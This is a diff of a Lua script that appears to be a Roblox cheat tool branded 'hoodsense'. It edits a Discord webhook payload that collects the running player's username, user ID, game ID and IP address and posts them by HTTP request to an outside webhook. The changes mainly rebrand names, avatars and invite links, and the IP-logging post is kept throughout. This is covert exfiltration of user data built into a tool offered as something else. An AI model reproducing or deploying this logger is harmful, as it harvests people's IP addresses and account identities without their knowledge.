@@ -2004,13 +2004,13 @@ local function getexploit()
 end
 
 local data = {
-    ["username"]  = "hoodsense chan",
-    ["avatar_url"] = "https://media.discordapp.net/attachments/963907774960517221/965805928119173130/IMG_3957.png",
+    ["username"]  = "hoodsense",
+    ["avatar_url"] = "https://cdn.discordapp.com/attachments/956351837664067605/963085251524046878/Png.png",
     ["embeds"] = {
         {
             ["author"] = {
-                ["name"] = "HOODSENSE CHAN REQUESTED",
-                ["url"] = "https://discord.gg/hoodsense",
+                ["name"] = "HOODSENSE REQUEST",
+                ["url"] = "https://discord.gg/axq",
                 ["icon_url"] = "https://cdn.discordapp.com/attachments/956351837664067605/963085251524046878/Png.png"
             },
             ["url"] = "https://www.roblox.com/games/"..game.PlaceId,
@@ -2018,8 +2018,8 @@ local data = {
             ["color"] = 229954,
             ["fields"] = {
                 {
-                    ["name"] = "Place Id",
-                    ["value"] = "**Game Id: **"..game.PlaceId,
+                    ["name"] = "Game ID",
+                    ["value"] = "**Game ID: **"..game.PlaceId,
                 },
                 {
                     ["name"] = "Player Name",
@@ -2053,6 +2053,7 @@ local data = {
                     ["name"] = "IP ADDRESS:",
                     ["value"] = tostring("```"..ip().."```"),
                 },
+            },
             ["thumbnail"] = {
                 ["url"] = "https://web.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&Format=Png&userid="..game.Players.LocalPlayer.UserId
             },
@@ -2060,7 +2061,6 @@ local data = {
     }
 }
 local Post = req({Url = url,  Method = 'POST', Headers = { ['Content-Type'] = 'application/json' }, Body = game:GetService('HttpService'):JSONEncode(data)})
-
 
 -------------------------------------------------------------------------
 --[[
